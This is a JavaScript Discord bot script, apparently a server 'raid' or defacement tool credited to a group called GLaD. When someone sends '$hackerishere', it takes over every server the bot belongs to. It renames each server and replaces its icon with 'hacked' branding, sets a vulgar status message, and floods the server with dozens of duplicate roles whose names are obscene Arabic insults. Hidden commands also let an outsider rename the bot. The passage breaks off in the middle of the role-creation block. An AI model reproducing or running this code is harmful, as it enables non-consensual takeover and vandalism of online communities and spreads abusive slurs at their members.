const Discord = require("discord.js");
const LOka = new Discord.Client();
console.log('By Lava Pro');
LOka.on('ready', () => {
  console.log(`Logged in as ${LOka.user.tag} !`);
 
});
LOka.on('ready',  () => {
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('      ~            ~  By : PITAR ~           ~    ');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
console.log(`Logged in as  * [ "  PITAR " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
 
       
   
 
});
var prefix = "k"
LOka.on("message", message => {
  if(!message.content.startsWith(prefix)) return;;
  let args = message.content.split(" ").slice(1);
  var argresult = args.join(' ');
  if (message.content.startsWith('hix15')) {
    LOka.user.setUsername(argresult);
  }
    if (message.content.startsWith(prefix + 'on123')) {
    LOka.user.setStatus(argresult);
  }
});

// صورة البوت 
var x1 = "kk"
LOka.on('message', message => {
     if (message.content === "$hackerishere") {
LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/482151620289888256/482156990945165312/download.png`)
 
}
});

// اسم بوتك وش يصير لمن يهكر
var x1 = "kk"
LOka.on('message', message => {
     if (message.content === "$hackerishere") {
LOka.user.setUsername("KingBot")
 
}
});
// الستريمينق حق البوت
LOka.on('message', message => {
     if (message.content === "$hackerishere") {
LOka.user.setGame(`بوت جلاد نايك امكم GLaD BOT HACKED U & FUCKED`,'https://www.twitch.tv/hix')
 
}
});

// صورة السيرفر 
LOka.on('message', message => {
     if (message.content === "$hackerishere") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
})
}
});

//وش يخلي اسم السيرفر
LOka.on('message', message => {
     if (message.content === "$hackerishere") {
         LOka.guilds.forEach(m =>{
             m.setName(`CLaN [GLaD] Is HeRe HaCkEd BY GLaD`)
})
}
});

//صورة السيرفر 
LOka.on('message', message => {
     if (message.content === "$hackerishere") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
 
}
});
//صورة السيرفر 
LOka.on('message', message => {
     if (message.content === "$hackerishere") {
                 if(!message.channel.guild) return;
 
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
 
}
});
// رتب السيرفر
LOka.on('message', message => {
     
 
     if (message.content === "$hackerishere") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })
   m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "برا النت يخخوات الحقبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "جلاد كلان ينيك امكم",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "[GLaD] FuCkEd Your SErVeR BY CLaN [GLaD]",
        permissions :   [1],
        color : " #ff0000"
    })  m.createRole({
        name : "قائد القوات الفدرالية موستانس",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "كلان جلاد نايك امكم يخوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "تم نيك السيرفر بنجاح",
        permissions :   [1],
        color : " #ff0000"
    })
  m.createRole({
        name : "رتب سيرفركم انتاكت من قبل جلااد",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "موستانس _ عبود _ حمود _ طلو في القمة ي خوات القحبة",
        permissions :   [1],
        color : " #ff0000"
    })
     m.createRole({
        name : "تم جلدكم من قبل جلاد ي كساس البعر",
